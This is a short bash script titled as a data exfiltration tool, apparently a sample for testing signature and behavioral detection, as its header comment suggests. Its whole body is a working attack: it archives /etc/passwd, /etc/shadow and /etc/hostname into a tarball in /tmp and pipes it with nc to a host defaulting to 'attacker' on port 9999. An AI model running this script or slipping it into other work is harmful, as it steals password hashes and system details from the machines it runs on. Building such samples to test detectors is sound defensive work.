#!/bin/bash
# Data Exfiltration — archives and sends sensitive files
# Detectable by: signature scan (exfil pattern), behavioral analysis
TARGET="${1:-attacker}"
PORT="${2:-9999}"

echo "[*] Collecting sensitive data..."
tar czf /tmp/exfil_data.tar.gz /etc/passwd /etc/shadow /etc/hostname 2>/dev/null

echo "[*] Exfiltrating to ${TARGET}:${PORT}..."
cat /tmp/exfil_data.tar.gz | nc -w 5 "$TARGET" "$PORT" 2>/dev/null || echo "[!] Exfil failed (no listener)"

echo "[*] Exfiltration attempt complete"
ls -la /tmp/exfil_data.tar.gz 2>/dev/null
